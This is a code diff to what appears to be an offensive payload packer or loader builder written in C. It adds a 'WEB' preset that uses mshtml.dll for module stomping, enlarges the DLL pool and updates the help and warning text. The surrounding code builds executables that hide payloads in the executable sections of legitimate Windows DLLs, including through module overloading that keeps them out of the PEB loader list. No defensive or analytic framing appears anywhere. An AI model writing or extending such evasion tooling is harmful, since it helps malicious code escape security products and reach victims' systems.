@@ -232,6 +232,8 @@ static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
                 cfg->dll_indices[0] = 3; cfg->dll_indices[1] = 4; cfg->dll_indices[2] = 5;
             } else if (_stricmp(preset, "NETWORK") == 0) {
                 cfg->dll_indices[0] = 6; cfg->dll_indices[1] = 7; cfg->dll_indices[2] = 8;
+            } else if (_stricmp(preset, "WEB") == 0) {
+                cfg->dll_indices[0] = 10; cfg->dll_indices[1] = 1; cfg->dll_indices[2] = 2;
             } else if (_stricmp(preset, "RANDOM") == 0) {
                 /* CryptGenRandom fills a byte for each index, then mod 10 */
                 HCRYPTPROV hProv = 0;
@@ -250,7 +252,7 @@ static BOOL ParseArgs(int argc, char* argv[], BUILD_CONFIG* cfg) {
                 if (cfg->dll_indices[2] == cfg->dll_indices[0] || cfg->dll_indices[2] == cfg->dll_indices[1])
                     cfg->dll_indices[2] = (cfg->dll_indices[2] + 1) % 10; /* two bumps guarantee uniqueness for 3 out of 10 */
             } else {
-                printf("[!] Unknown preset: %s  (valid: PRINT, MEDIA, NETWORK, RANDOM)\n", preset);
+                printf("[!] Unknown preset: %s  (valid: PRINT, MEDIA, NETWORK, WEB, RANDOM)\n", preset);
                 return FALSE;
             }
         }
@@ -341,7 +343,7 @@ static void PrintUsage(void) {
     printf("\n");
     printf("Loader:\n");
     printf("  --stub <path>              Loader stub PE  [default: random ./stub_v0.bin..stub_v3.bin]\n");
-    printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
+    printf("  --preset PRINT|MEDIA|NETWORK|WEB|RANDOM\n");
     printf("                             Module stomping DLL preset  [default: PRINT]\n");
     printf("  --overload                 Module overloading instead of stomping\n");
     printf("                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)\n");
@@ -676,7 +678,7 @@ int main(int argc, char* argv[]) {
    * deserves a warning *before* shipping an exe that will silently crash.
    *
    * Implementation:
-   *   - Mirror the same 10-DLL pool used by ModuleStomping.c.
+   *   - Mirror the same 11-DLL pool used by ModuleStomping.c.
    *   - For each of the 3 preset indices: LoadLibraryExA (DONT_RESOLVE_DLL_REFERENCES
    *     so we get a flat mapping with no side effects), walk PE sections, find the
    *     largest IMAGE_SCN_MEM_EXECUTE section, compare VirtualSize to totalSize.
@@ -684,7 +686,7 @@ int main(int argc, char* argv[]) {
    *   - If none of the three DLLs is large enough: print a prominent warning and
    *     suggest --preset RANDOM or a different preset. */
   {
-      static const char* kDllPool[10] = {
+      static const char* kDllPool[11] = {
           "xpsservices.dll",  /* 0 — PRINT   */
           "msi.dll",          /* 1 — PRINT   */
           "dbghelp.dll",      /* 2 — PRINT   */
@@ -695,6 +697,7 @@ int main(int argc, char* argv[]) {
           "wtsapi32.dll",     /* 7 — NETWORK */
           "wlanapi.dll",      /* 8 — NETWORK */
           "bcrypt.dll",       /* 9 — CRYPTO  */
+          "mshtml.dll",       /* 10 — WEB    */
       };
 
       printf("[*] Phase 9: Verifying preset DLL section sizes...\n");
@@ -702,7 +705,7 @@ int main(int argc, char* argv[]) {
       int anyFit = 0;
       for (int i = 0; i < 3; i++) {
           BYTE idx = cfg.dll_indices[i];
-          if (idx >= 10) continue;
+          if (idx >= 11) continue;
 
           const char* dllName = kDllPool[idx];
           /* DONT_RESOLVE_DLL_REFERENCES: flat file mapping, no DllMain, no imports */
@@ -747,7 +750,7 @@ int main(int argc, char* argv[]) {
               "\n[!] WARNING: None of the preset DLLs has an executable section large\n"
               "             enough for the payload (%zu bytes).\n"
               "             The packed exe will fail at runtime (module-stomp alloc).\n"
-              "             Try a different preset:  --preset MEDIA / NETWORK / RANDOM\n\n",
+              "             Try a different preset:  --preset WEB (large payloads) / MEDIA / NETWORK / RANDOM\n\n",
               mutated.totalSize);
 		  /* Warning only — we still proceed with the build, Stub will handle the failure gracefully. */
       }
